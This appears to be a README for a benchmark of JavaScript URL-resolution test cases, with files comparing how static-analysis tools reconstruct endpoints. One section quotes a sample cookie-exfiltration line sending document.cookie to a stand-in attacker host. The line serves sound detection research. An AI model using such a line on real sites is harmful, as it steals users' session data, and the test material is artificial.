# Handcrafted micro-benchmark cases

Each file isolates **one** static-resolution technique so the per-category results table has clean,
attributable rows. Ground truth (category + expected URLs) is in `../manifest.json`. These are the
consolidation of the author's cases and the student's (`lynx-cases/`) test files, with anything
already exercised by the relwarc test app removed (see below).

Cases use absolute `https://` URLs (self-contained, no base needed). Run each through every tool on
the **same single-file substrate**; expected URLs follow the DEP-mining recall philosophy (all
*reachable* endpoints are expected, including both branches of a hardcoded conditional).

| File | Technique | Notes |
|---|---|---|
| `literal.js` | pure string literal | control/floor — every tool must pass |
| `plus_equals.js` | `+=` compound-assignment accumulation | distinct AST path from binary-`+`; resolvable (unlike relwarc 7) so it discriminates regex vs abstract-interp tools |
| `template_unresolved.js` | runtime-unknown value in a template | tests the **templated_path** scoring tier (no tool can fully resolve; regex tools emit garbage) |
| `object_config.js` | URL read from a nested object property | self-contained (cf. relwarc 10/11/14 which need cross-script config) |
| `computed_member_sink.js` | `window[method](url)` computed sink | LyN-X resolves the computed global sink |
| `iife_scenarios.js` | 6 IIFE/closure variants | doc-alias + `<script>.src` sink, computed member, fn-as-arg, default param, `URLSearchParams`+`toString`, member-alias |
| `loop_urlsearchparams.js` | for-loop path build + `URLSearchParams` query | hardest constructive case LyN-X still resolves (loop + `Object.entries`) |
| `loop_forof_construct.js` | `for…of` over an array, endpoint built per element | LyN-X iterates the collection and reconstructs every endpoint; the full URLs aren't literals (regex gets only the base) |
| `loop_foreach_construct.js` | `Array.forEach` arrow callback, endpoint per element | binds the callback's element parameter to the array values (regex can't reach the constructed URLs) |
| `loop_map_resource.js` | collection → injected `<script>.src` per element | loop + resource-load sink: chunk names folded into a CDN URL and assigned to a created element's `.src` |
| `conditional_protocol.js` | `if/else` → two protocols | **path-sensitivity**: LyN-X emits both `http://` and `https://` |
| `conditional_path.js` | ternary × `if/else` | **path-sensitivity**: LyN-X emits the full 2×2 cartesian of reachable paths |

## Removed as redundant with the relwarc test app (`../relwarc-cases/`)

The relwarc DEP-mining app already exercises these techniques (self-contained cases resolvable from a
single `.js` file: 4, 5, 6, 8, 9, 12, 15), so equivalent handcrafted cases were dropped:

- **string concatenation** (`concat.js`, student `test2`/`test5`) → relwarc 5, 6, 7
- **cross-statement var + reassign** (`cross_statement.js`) → relwarc 7
- **simple interprocedural** (`interprocedural.js`, student `test1`) → relwarc 8, 9 (deeper)
- **simple IIFE** (`iife.js`) → relwarc 14 + the richer `iife_scenarios.js` here
- **template-literal of constants** (student `test3`) → relwarc 9 + `template_unresolved.js`

## Not here: sensitive-source-in-URL (belongs to the security study)

A case like `fetch("https://track.evil/collect?c=" + document.cookie + "&u=" + location.href)` is a
prime **source→sink exfiltration** signal — and LyN-X resolves it to
`.../collect?c={VAR:document.cookie}&u={VAR:location.href}`. But the benchmark scorer **strips the
query** before matching, so its distinctive part (the sensitive params) isn't measured here; on
host+path it's just a trivial exact. So it lives in the **E9b security eval** (source→off-origin-sink
detection), not this URL-resolution micro-benchmark.

## Substrate note (single file vs end-to-end HTML)

These cases are for the **single local `.js` file** substrate — the controlled, tool-agnostic
comparison of raw static-resolution power. relwarc's **HTML-dependent** cases (7, 10, 11, 14 — needing
`param7`/`configUn*` defined in `index.html`; plus 1, 2, 3, 13, 16, 17 which live in HTML) are *not*
valid on isolated `.js` and belong to a separate **end-to-end HTML** experiment
(`../relwarc-cases/html-cases/`). See the project notes for the tradeoff discussion.
